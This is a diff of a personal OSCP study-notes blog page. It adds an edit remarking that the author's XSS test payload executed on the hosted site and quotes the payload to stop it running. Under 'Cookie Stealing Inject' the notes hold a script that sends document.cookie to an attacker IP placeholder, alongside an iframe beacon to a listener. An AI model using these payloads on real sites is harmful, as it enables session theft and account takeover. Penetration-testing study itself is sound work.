@@ -5,8 +5,10 @@ title: OSCP Notes
 
 ## BLUF  
 "Bottom Line Up Front" for the non-military types. Honestly I just want to get my notes onto the interwebs and off my VM. I've 
-done a lot of bash scripting in OSCP that is super useful, but I can't always remember the syntax. Here's to fixing that. I'll do 
-another blog post tomorrow when I'm not half asleep
+done a lot of bash scripting in OSCP that is super useful, but I can't always remember the syntax. Here's to fixing that. I'll do another blog post tomorrow when I'm not half asleep.  
+Edit: After posting this my JS XSS tester executed. Kinda surprising that Github lets you incorporate XSS into a site they host. 
+Maybe it's just a don't ask don't tell policy? Gotta put some filler in to stop the code from executing since it would probably 
+freak out any onlookers.
 
 ## Meat and Potatoes  
 
@@ -57,8 +59,8 @@ for ip in $(cat ./WGET/web_vuln_ips); do  tail -n +1 ./WGET/$ip/* | grep 10.11.1
 ### XSS Commands
 
 #### Test  
-<iframe SRC="(use your IP):(Port to listen on) /report" height="0" width="0"></iframe>
-<script>alert("XSS through Javascript, success");</script>
+"<iframe SRC="(use your IP):(Port to listen on) /report" height="0" width="0"></iframe>
+<script>alert("XSS through Javascript, success");</script>"  -------------
 
 #### Cookie Stealing Inject  
 <script>new Image().src="http://(use your IP):81 /bogus.php?output="+document.cookie;</script>
